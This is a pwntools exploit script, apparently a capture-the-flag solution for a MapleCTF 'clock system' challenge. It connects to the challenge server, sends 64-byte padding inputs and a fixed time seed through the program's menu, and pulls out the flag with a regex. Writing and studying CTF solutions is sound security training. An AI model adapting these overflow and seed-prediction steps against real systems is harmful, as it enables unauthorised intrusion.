#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host rsa.ctf.maplebacon.org --port 1337
from pwn import *

context.log_level = 50

# Set up pwntools for the correct architecture
exe = "./vuln"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "my-clock-system.ctf.maplebacon.org"
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def start_remote():
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote()


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

import re

io = start()

SEED = 4546713
io.recvlines(3)
io.sendline(b"1")
io.recvline()
io.sendline(b"a" * 64)
io.recvuntil(b"> > ")
io.sendline(b"2")
io.sendlineafter(b"please enter current time: ", str(SEED).encode())
io.sendlineafter(b"> ", b"3")
io.recvline()
io.sendline(b"a" * 64)
io.recvlines(2)
io.sendlineafter(b"> > ", b"4919")
print(re.search(r"maple\{[a-zA-Z0-9_!\-\?]+\}", io.recvline().decode())[0])
io.close()
